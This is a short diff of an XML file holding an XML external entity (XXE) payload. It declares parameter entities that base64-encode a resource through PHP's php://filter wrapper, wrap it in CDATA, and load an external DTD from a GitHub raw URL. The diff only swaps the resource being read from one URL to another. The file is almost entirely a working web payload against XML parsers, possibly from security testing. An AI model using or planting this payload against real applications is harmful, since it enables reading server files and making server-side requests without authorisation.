@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/master/xml.xml">
+ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://php.net/manual/en/wrappers.php">
  <!ENTITY % start SYSTEM "<![CDATA["> 
  <!ENTITY % end SYSTEM "]]>">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
